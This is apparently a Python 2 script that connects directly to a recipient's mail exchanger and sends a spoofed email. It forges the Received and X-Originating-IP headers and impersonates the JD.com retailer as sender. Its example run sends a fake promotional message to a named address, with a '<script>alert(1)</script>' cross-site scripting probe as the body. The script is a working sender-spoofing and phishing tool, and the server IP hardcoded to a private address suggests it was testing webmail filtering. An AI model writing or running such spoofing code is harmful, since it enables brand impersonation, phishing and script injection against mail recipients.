# coding=utf-8
import socket
import select
import base64
import os, re
import time, datetime

class mail:
    def __init__(self):
        self.errmsg = ''
    def send(self, buf):
        try:
            byteswritten = 0
            while byteswritten < len(buf):
                byteswritten += self.__sockfd.send(buf[byteswritten:])
        except:
            pass
    def recvline(self, strline):
        detect_fds = [self.__sockfd, ]
        rrdy, wrdy, erdy = select.select(detect_fds, [], [], 20)
        if len(rrdy) == 0:
            return False
        else:
            while True:
                try:
                    strtmp = self.__sockfd.recv(1)
                    strline[0] += strtmp[0]
                    if (strtmp[0] == '\n'):
                        print 'server  : ' + strline[0]
                        break
                except:
                    return False
            return True
    def getresp(self, resp_str):
        while True:
            if (self.recvline(resp_str) == False):
                return False
            else:
                if resp_str[0][3] != '-':
                    break;
        return True
    def mailhelo(self, hostname):
        self.send('helo %s\r\n' % hostname)
        print 'host say: helo %s' % hostname
        resp_str = ['', ]
        if (self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '250':
            return True
        else:
            self.errmsg = resp_str[0]
            return False

    def mailfrom(self, fromstr):
        self.send('mail from: <%s>\r\n' % fromstr)
        print 'host say: mail from: <%s>' % fromstr
        resp_str = ['', ]
        if (self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '250':
            return True
        else:
            self.errmsg = resp_str[0]
            return False
    def mailto(self, tostr):
        self.send('rcpt to: <%s>\r\n' % tostr)
        print 'host say: rcpt to: <%s>' % tostr
        resp_str = ['', ]
        if (self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '250':
            return True
        else:
            self.errmsg = resp_str[0]
            return False
    def maildata(self):
        self.send('data\r\n')
        print 'host say: data'
        resp_str = ['', ]
        if (self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '354':
            return True
        else:
            self.errmsg = resp_str[0]
            return False

    def mailbody(self, bodystr):
        print 'host say: ' + 'Received: from ICE (unknown [183.60.62.11])'
        print'host say: ' + '.by 183.60.62.11 (Coremail) with SMTP id _bJCALesoEAeAFMU.1'
        print'host say: ' + '.for <' + self.To + '>; ' + time.strftime("%a, %d %b %Y %H:%M:%S +0800 (CST)",time.localtime())
        print'host say: ' + 'X-Originating-IP: [192.168.0.1]'
        print'host say: ' + 'Date: Tue, 22 Nov 2011 16:18:06 +0800'
        print'host say: ' + 'From: "京东网上商城" <' + self.From + '>'
        print'host say: ' + 'Subject:' + self.Subject
        print'host say: ' + 'To: <' + self.To + '>'
        print'host say: ' + 'X-Priority: 1'
        print'host say: ' + 'X-mailer: iceMail 1.0 [cn]'
        print'host say: ' + 'Mime-Version: 1.0'
        print'host say: ' + 'Content-Type: text/plain;'
        print'host say: ' + '.charset="GB2312"'
        print'host say: ' + 'Content-Transfer-Encoding: quoted-printable'
        print 'host say: ' + bodystr
        self.send('Received: from ICE (unknown [8.8.8.8])\n')
        self.send('.by 8.8.8.8 (Coremail) with SMTP id _bJCALesoEAeAFMU.1\n')
        self.send(
            '.for <' + self.To + '>; ' + time.strftime("%a, %d %b %Y %H:%M:%S +0800 (CST)", time.localtime()) + '\n')
        self.send('X-Originating-IP: [8.8.8.8]\n')
        self.send('Date: ' + time.strftime("%a, %d %b %Y %H:%M:%S +0800", time.localtime()) + '\n')
        self.send('From: ' + self.FromName + '<' + self.From + '>\r\n')
        self.send('Subject: ' + self.Subject + '\r\n')
        self.send('To: <' + self.To + '>\r\n')
        self.send('X-Priority: 3\r\n')     #这个是设置邮件优先级的，优先级1和2 是非常重要 3是普通邮件
        self.send('X-mailer: iceMail 1.0 [cn]\r\n')
        self.send('Mime-Version: 1.0\r\n')
        self.send('Content-Type: text/plain;\r\n')
        self.send('.charset="GB2312"\r\n')
        self.send('Content-Transfer-Encoding: quoted-printable\r\n\r\n')
        self.send(bodystr)
        self.send('\r\n.\r\n')
        resp_str = ['', ]
        if (self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '250':
            return True
        else:
            self.errmsg = resp_str[0]
            return False
    def mailquit(self):
        self.send('quit\r\n')
        print 'host say: quit'
        resp_str = ['', ]
        if (self.getresp(resp_str) == False):
            return False
        if resp_str[0][0:3] == '221':
            print 'server  : Bye'
            print 'mail send ok'
            return True
        else:
            self.errmsg = resp_str[0]
            return False
    def txmail(self, hostname, mailfrom, rcptto, bodystr):
        mx_server_list = []
        mail_postfix = re.split('@', rcptto)
        try:
            outstr = os.popen('nslookup -type=mx -timeout=10 %s' % mail_postfix[1], 'r').read()
        except Exception, e:
            print 'DEBUG: Execute nslookup:', e
            return False
        linestr = re.split('\n', outstr)
        for s in linestr:
            if re.match('.+[ |\t]mail exchanger[ |\t].+', s) != None:
                c = re.split(' |\t', s)
                mx_server_list.append(c[len(c) - 1])
        if len(mx_server_list) == 0:
            self.errmsg = 'Can not find MX server'
            return False
        for mx_element in mx_server_list:
            return_val = True
            mx_server_ip = socket.gethostbyname(mx_element)
            mx_server_ip ='192.168.10.112'     #这个是解析到的邮箱的地址
            tx_sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
            try:
                tx_sockfd.connect((mx_server_ip, 25))
                self.__sockfd = tx_sockfd
                resp_str = ['', ]
                self.getresp(resp_str)
                if self.mailhelo(hostname) and self.mailfrom(mailfrom) and self.mailto(
                        rcptto) and self.maildata() and self.mailbody(bodystr) and self.mailquit():
                    pass
                else:
                    return_val = False
            except Exception, e:
                return_val = False
            try:
                tx_sockfd.close()
            except:
                pass
            if return_val == True:
                break
        return return_val
    def sendMail(self):
        self.StmpHost = self.From.split("@")[1]
        try:
            self.txmail(self.StmpHost, self.From, self.To, self.Data)
        except Exception,e:
            print self.errmsg
        print self.errmsg

if __name__ == '__main__':
    icemail = mail()
    icemail.Port = 25
    icemail.To = 'changhanqiang@email.lessnet.com'
    icemail.From = 'newsletter@360buy.com'
    icemail.FromName = "京东网上商城 "
    icemail.Subject = "得力办公文具全场每满100减30元，买鼠标即可得鼠标垫！(AD)"
    icemail.Data = '<script>alert(1)</script>'
    icemail.sendMail()
